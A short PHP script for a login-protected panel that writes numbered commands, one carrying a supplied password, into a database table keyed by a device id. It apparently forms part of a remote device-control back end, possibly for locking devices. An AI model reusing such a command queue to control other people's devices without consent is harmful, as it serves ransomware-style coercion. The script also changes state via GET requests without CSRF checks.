<?php

session_start();
if(!isset($_SESSION['logged'])){echo"<script>window.location.href = 'login.php';</script>";exit();}

include"db.php";

if(isset($_GET["status"]) && isset($_GET["id"])){
	
$id=mysqli_real_escape_string($con,$_GET["id"]);
$status=mysqli_real_escape_string($con,$_GET["status"]);

$command="";
if($status==="0"){
	if(!isset($_GET["password"])){exit();}
	$pass=mysqli_real_escape_string($con,$_GET["password"]);
	$command="4|".$pass;
	
}

else {
	$command="3|null";
	
}



@mysqli_query($con,"INSERT INTO commands VALUES ('$id','$command')");
}






?>